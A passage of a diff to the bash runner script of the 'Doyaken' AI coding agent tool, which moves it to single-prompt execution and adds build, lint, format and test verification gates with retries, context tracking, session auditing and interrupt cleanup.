-  echo "  Model: $CURRENT_MODEL"
-  echo "  Phases: EXPAND → TRIAGE → PLAN → IMPLEMENT → TEST → DOCS → REVIEW → VERIFY"
-  if [ "$AGENT_QUIET" = "1" ]; then
-    echo "  Output: quiet"
-  elif [ "$AGENT_PROGRESS" != "1" ]; then
-    echo "  Output: full stream"
-  else
-    echo "  Output: progress"
-  fi
-  echo ""
-
-  local exit_code=0
-  if ! run_all_phases "$task_id" "$task_file"; then
-    exit_code=1
-  fi
-
-  stop_heartbeat
+  GATE_RESULT="$gate_output"
 
   if [ "$exit_code" -eq 0 ]; then
-    log_success "Task iteration completed successfully"
-    save_session "$session_id" "$iteration" "completed"
-
-    reset_model
-
-    local done_file done_dir
-    done_dir=$(get_task_folder "done")
-    done_file="$done_dir/$(basename "$task_file")"
-    if [ -f "$done_file" ]; then
-      release_lock "$task_id"
-      unassign_task "$done_file"
-      commit_task_files "chore: Complete task $task_id" "$task_id"
-    fi
-
+    log_success "Gate $gate_name: PASS"
+    audit_gate "$gate_name" "pass"
     return 0
   else
-    log_error "Task iteration failed"
-    save_session "$session_id" "$iteration" "failed"
+    log_warn "Gate $gate_name: FAIL (exit $exit_code)"
+    audit_gate "$gate_name" "fail"
     return 1
+  fi
+}
+
+# Run verification gates for a phase
+# Args: phase_name
+# Returns: 0=all pass (or all skipped), 1=at least one failed
+# Sets: GATE_ERRORS (combined error output)
+run_verification_gates() {
+  local phase_name="$1"
+  local any_failed=0
+  local any_configured=0
+  GATE_ERRORS=""
+
+  # All phases run all configured quality gates.
+  # Gates with empty commands are automatically skipped.
+  local gates=(
+    "build:${QUALITY_BUILD_CMD:-}"
+    "lint:${QUALITY_LINT_CMD:-}"
+    "format:${QUALITY_FORMAT_CMD:-}"
+    "test:${QUALITY_TEST_CMD:-}"
+  )
+
+  local gate_results=""
+  for gate_entry in "${gates[@]}"; do
+    local gate_name="${gate_entry%%:*}"
+    local gate_cmd="${gate_entry#*:}"
+
+    local gate_rc=0
+    GATE_RESULT=""
+    _run_gate "$gate_name" "$gate_cmd" || gate_rc=$?
+
+    case "$gate_rc" in
+      0) gate_results="${gate_results}${gate_name}=PASS " ;;
+      1)
+        gate_results="${gate_results}${gate_name}=FAIL "
+        GATE_ERRORS="${GATE_ERRORS}--- ${gate_name} ---\n${GATE_RESULT}\n\n"
+        any_failed=1
+        any_configured=1
+        ;;
+      2) gate_results="${gate_results}${gate_name}=SKIP " ;;
+    esac
+
+    # Track that at least one gate was configured (not skipped)
+    if [ "$gate_rc" -eq 0 ]; then
+      any_configured=1
+    fi
+  done
+
+  if [ "$any_configured" -eq 0 ]; then
+    log_info "No quality gates configured - pass-through"
+    return 0
+  fi
+
+  log_info "Gate results: $gate_results"
+
+  if [ "$any_failed" -eq 1 ]; then
+    return 1
+  fi
+  return 0
+}
+
+# Run a phase with verification gates and retry loop
+# Wraps run_phase() with gate checking and accumulated context
+run_phase_with_verification() {
+  local phase_name="$1"
+  local prompt_file="$2"
+  local timeout="$3"
+  local skip="$4"
+  local task_id="$5"
+  local task_prompt="$6"
+  local phase_idx="${7:-}"
+  local total_phases="${8:-}"
+
+  # If phase is skipped, delegate directly
+  if [ "$skip" = "1" ]; then
+    run_phase "$phase_name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases"
+    return $?
+  fi
+
+  # Get retry budget for this phase
+  local phase_lower
+  phase_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
+  local budget_var="RETRY_BUDGET_${phase_name}"
+  local max_verification_attempts="${!budget_var:-3}"
+
+  local verification_attempt=1
+  while [ "$verification_attempt" -le "$max_verification_attempts" ]; do
+    # Check for interrupt
+    if [ "$INTERRUPTED" = "1" ]; then
+      return 130
+    fi
+
+    # Clear verification context for first attempt
+    if [ "$verification_attempt" -eq 1 ]; then
+      PHASE_VERIFICATION_CONTEXT=""
+    fi
+
+    # Run the phase (inner loop handles rate-limit retries)
+    local phase_result=0
+    run_phase "$phase_name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases" || phase_result=$?
+
+    # Propagate interrupt
+    if [ "$phase_result" -eq 130 ]; then
+      return 130
+    fi
+
+    # Phase failed at the agent level (not gate level)
+    if [ "$phase_result" -ne 0 ]; then
+      return "$phase_result"
+    fi
+
+    # Phase succeeded - now run verification gates
+    local gate_result=0
+    run_verification_gates "$phase_name" || gate_result=$?
+
+    if [ "$gate_result" -eq 0 ]; then
+      # All gates passed
+      log_success "$phase_name verification gates passed"
+      return 0
+    fi
+
+    # Gates failed - prepare context for retry
+    if [ "$verification_attempt" -lt "$max_verification_attempts" ]; then
+      log_warn "$phase_name verification failed (attempt $verification_attempt/$max_verification_attempts) - retrying with error context"
+
+      # Build verification context for next attempt
+      PHASE_VERIFICATION_CONTEXT="VERIFICATION FAILURE (attempt $verification_attempt/$max_verification_attempts):
+The previous $phase_name attempt completed but quality gates FAILED.
+Fix these errors before proceeding:
+
+$(echo -e "$GATE_ERRORS")"
+
+      # Append to accumulated context
+      append_phase_context "$task_id" "$phase_name" "$verification_attempt" \
+        "Gate failures:\n$(echo -e "$GATE_ERRORS" | head -30)"
+    fi
+
+    ((++verification_attempt))
+  done
+
+  # All verification attempts exhausted
+  log_error "$phase_name failed verification after $max_verification_attempts attempts"
+  log_info "Check logs: $RUN_LOG_DIR"
+  return 3  # Needs human input
+}
+
+# ============================================================================
+# Context Tracking
+# ============================================================================
+
+# Get path to context file for a task
+get_context_file() {
+  local task_id="$1"
+  echo "$STATE_DIR/context-${task_id}.md"
+}
+
+# Append structured context from a phase attempt
+append_phase_context() {
+  local task_id="$1"
+  local phase="$2"
+  local attempt="$3"
+  local content="$4"
+
+  local context_file
+  context_file=$(get_context_file "$task_id")
+
+  # Append structured block
+  {
+    echo ""
+    echo "## Phase: $phase — Attempt $attempt"
+    echo "Timestamp: $(date '+%Y-%m-%d %H:%M')"
+    echo -e "$content"
+    echo ""
+  } >> "$context_file"
+
+  # Cap at ~200 lines - trim oldest entries if exceeded
+  if [ -f "$context_file" ]; then
+    local line_count
+    line_count=$(wc -l < "$context_file" | tr -d ' ')
+    if [ "$line_count" -gt 200 ]; then
+      local trim_lines=$((line_count - 150))
+      tail -n +$((trim_lines + 1)) "$context_file" > "${context_file}.tmp"
+      mv "${context_file}.tmp" "$context_file"
+    fi
   fi
 }
 
@@ -1678,54 +1992,25 @@ run_agent_iteration() {
 
 cleanup() {
   if [ "$INTERRUPTED" = "1" ]; then
-    log_info "Interrupted - preserving task state for resume..."
-
-    stop_heartbeat
-
-    rm -rf "$LOCKS_DIR/.${AGENT_ID}.active" 2>/dev/null || true
-
-    # Run taskboard regeneration
-    local taskboard_script="$DOYAKEN_HOME/lib/taskboard.sh"
-    if [ ! -f "$taskboard_script" ]; then
-      taskboard_script="$SCRIPTS_DIR/taskboard.sh"
-    fi
-    if [ -x "$taskboard_script" ]; then
-      DOYAKEN_PROJECT="$PROJECT_DIR" "$taskboard_script" 2>/dev/null || true
-    fi
-
-    log_info "Task preserved in doing/ - run 'doyaken' to resume"
+    log_info "Interrupted - run 'dk run' again to resume"
   else
     log_info "Cleaning up..."
-
-    stop_heartbeat
-
-    release_all_locks
-
-    rm -rf "$LOCKS_DIR/.${AGENT_ID}.active" 2>/dev/null || true
-
-    local doing_dir
-    doing_dir=$(get_task_folder "doing")
-    for file in "$doing_dir"/*.md; do
-      [ -f "$file" ] || continue
-      if grep -q "$AGENT_ID" "$file" 2>/dev/null; then
-        unassign_task "$file"
-      fi
-    done
-
-    # Run taskboard regeneration
-    local taskboard_script="$DOYAKEN_HOME/lib/taskboard.sh"
-    if [ ! -f "$taskboard_script" ]; then
-      taskboard_script="$SCRIPTS_DIR/taskboard.sh"
-    fi
-    if [ -x "$taskboard_script" ]; then
-      DOYAKEN_PROJECT="$PROJECT_DIR" "$taskboard_script" 2>/dev/null || true
-    fi
   fi
+
+  stop_phase_monitor
 }
 
 handle_interrupt() {
   echo ""
+  log_warn "Ctrl+C received - shutting down..."
   INTERRUPTED=1
+
+  # Kill background monitors immediately (they now have signal handlers)
+  stop_phase_monitor
+
+  # Kill all remaining child processes (agent pipeline, tee, etc.)
+  pkill -P $$ 2>/dev/null || true
+
   exit 130
 }
 
@@ -1737,17 +2022,27 @@ trap cleanup EXIT
 # ============================================================================
 
 main() {
-  log_header "Doyaken Agent Runner (Phase-Based)"
+  # Read prompt from environment (set by cli.sh)
+  local task_prompt="${DOYAKEN_PROMPT:-}"
+  if [ -z "$task_prompt" ]; then
+    log_error "No prompt provided. Usage: dk run \"your prompt here\""
+    exit 1
+  fi
+
+  # Generate a task ID from the prompt slug (for log naming, context file)
+  local task_id
+  task_id=$(echo "$task_prompt" | tr '[:upper:]' '[:lower:]' | tr -cs '[:alnum:]' '-' | sed 's/^-//;s/-$//' | cut -c1-50)
+  task_id="${task_id:-task}"
+
+  log_header "Doyaken Agent Runner"
   echo ""
   echo "  Project: $PROJECT_DIR"
-  echo "  Data: $DATA_DIR"
-  echo "  Worker ID: $AGENT_ID"
-  echo "  Tasks to run: $NUM_TASKS"
+  echo "  Prompt: ${task_prompt:0:80}$([ ${#task_prompt} -gt 80 ] && echo "...")"
+  echo "  Task ID: $task_id"
   echo "  AI Agent: $DOYAKEN_AGENT"
   echo "  Model: $DOYAKEN_MODEL"
   echo "  Max retries: $AGENT_MAX_RETRIES per phase"
-  echo "  Lock timeout: ${AGENT_LOCK_TIMEOUT}s ($(( AGENT_LOCK_TIMEOUT / 3600 ))h)"
-  echo "  Heartbeat: ${AGENT_HEARTBEAT}s ($(( AGENT_HEARTBEAT / 60 ))min)"
+  echo "  Phase monitor: every ${PHASE_MONITOR_INTERVAL}s, stall warning at ${PHASE_STALL_THRESHOLD}s"
   if [ "$AGENT_QUIET" = "1" ]; then
     echo "  Output: quiet (no streaming)"
   elif [ "$AGENT_PROGRESS" != "1" ]; then
@@ -1769,6 +2064,11 @@ main() {
   echo "  Log dir: $RUN_LOG_DIR"
   echo ""
 
+  # Check first-run warning (skip if safe mode or already acknowledged)
+  if [ "${DOYAKEN_SAFE_MODE:-0}" != "1" ]; then
+    check_first_run_warning
+  fi
+
   init_state
 
   if ! health_check; then
@@ -1776,10 +2076,8 @@ main() {
     exit 1
   fi
 
-  local start_iteration=1
+  # Resume from interrupted session if available
   if load_session; then
-    log_heal "Resuming from iteration ${ITERATION:-1}"
-    start_iteration="${ITERATION:-1}"
     if [ -n "${LOG_DIR:-}" ] && [ -d "$LOG_DIR" ]; then
       RUN_LOG_DIR="$LOG_DIR"
       log_info "Resuming logs in: $RUN_LOG_DIR"
@@ -1788,61 +2086,56 @@ main() {
 
   validate_environment
 
-  local completed=0
-  local failed=0
-  local skipped=0
   CONSECUTIVE_FAILURES=$(get_consecutive_failures)
 
-  for ((i=start_iteration; i<=NUM_TASKS; i++)); do
-    if run_with_retry "$i"; then
-      ((completed++))
-      # Track for periodic review
-      review_tracker_increment > /dev/null 2>&1 || true
-    else
-      local available
-      available=$(get_next_available_task) || true
-      if [ -z "$available" ] && [ "$(count_tasks todo)" -eq 0 ]; then
-        log_info "No more tasks available - stopping early"
-        ((skipped++))
-        break
-      fi
-      ((failed++))
-      log_warn "Moving to next task after exhausting retries..."
-    fi
-
-    if [ "$i" -lt "$NUM_TASKS" ]; then
-      sleep 2
-    fi
-  done
-
-  if [ "$failed" -eq 0 ]; then
-    clear_session
+  # Load circuit breaker state from previous run
+  if declare -f cb_load_state &>/dev/null; then
+    cb_load_state "${AGENT_ID:-agent}"
   fi
 
-  log_header "Run Complete"
-  echo ""
-  echo "  Agent: $AGENT_ID"
-  echo "  Project: $PROJECT_DIR"
-  echo "  Completed: $completed"
-  echo "  Failed: $failed"
-  echo "  Skipped: $skipped"
-  echo "  Logs: $RUN_LOG_DIR"
-  echo ""
-  show_task_summary
+  # Save session as running
+  save_session "$SESSION_ID" "running"
 
-  if [ "$failed" -gt 0 ]; then
-    log_warn "Some tasks failed - run 'doyaken' again to retry"
+  # Audit: session start
+  AUDIT_LOG="$DATA_DIR/audit.log"
+  audit_init "${SESSION_ID:-$task_id}"
+
+  # Single-shot execution: run all phases for the prompt
+  local run_result=0
+  run_all_phases "$task_id" "$task_prompt" || run_result=$?
+
+  if [ "$run_result" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
+    log_warn "Interrupted during execution"
+    save_session "$SESSION_ID" "interrupted"
+    exit 130
+  fi
+
+  if [ "$run_result" -eq 3 ]; then
+    log_warn "Execution paused - human input needed"
+    log_info "Check logs for details, then re-run: dk run \"$task_prompt\""
+    save_session "$SESSION_ID" "paused"
     exit 1
   fi
 
-  log_success "All tasks completed successfully!"
-
-  # Check if periodic review should be triggered
-  if review_tracker_is_enabled && review_tracker_should_trigger; then
-    echo ""
-    log_info "Periodic review threshold reached ($(review_tracker_status))"
-    log_info "Run 'doyaken review' to perform a codebase review"
+  if [ "$run_result" -ne 0 ]; then
+    log_error "Execution failed (exit code: $run_result)"
+    log_info "Check logs: $RUN_LOG_DIR"
+    save_session "$SESSION_ID" "failed"
+    exit 1
   fi
+
+  # Success
+  clear_session
+  clear_phase_progress
+
+  log_header "Run Complete"
+  echo ""
+  echo "  Project: $PROJECT_DIR"
+  echo "  Prompt: ${task_prompt:0:80}$([ ${#task_prompt} -gt 80 ] && echo "...")"
+  echo "  Logs: $RUN_LOG_DIR"
+  echo ""
+
+  log_success "Execution completed successfully!"
 }
 
 # ============================================================================
